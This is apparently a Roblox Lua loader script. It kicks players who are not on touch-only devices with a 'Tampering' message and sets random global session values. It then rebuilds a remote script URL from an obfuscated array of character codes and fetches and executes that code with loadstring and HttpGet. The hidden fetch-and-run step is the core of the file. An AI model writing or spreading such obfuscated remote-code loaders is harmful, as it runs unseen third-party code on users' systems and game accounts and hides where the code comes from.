local l1l1ll1 = game:GetService("Players").LocalPlayer
local UIS = game:GetService("UserInputService")

local function checkMobile()
    local isMobile = (UIS.TouchEnabled and not UIS.KeyboardEnabled)
    if not isMobile or UIS.MouseEnabled then
        return false
    end
    return true
end

if not checkMobile() then
    l1l1ll1:Kick("Tampering")
    return
end

_G.SESSION_TOKEN = math.random(100000, 999999)
_G.Processor = math.random(1000, 9000)

local _raw = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 79, 80, 73, 76, 79, 73, 47, 82, 101, 108, 101, 97, 115, 101, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 83, 116, 101, 112, 52, 46, 108, 117, 97}
local _url = ""
for i = 1, #_raw do
    _url = _url .. string.char(_raw[i])
end

loadstring(game:HttpGet(_url))()
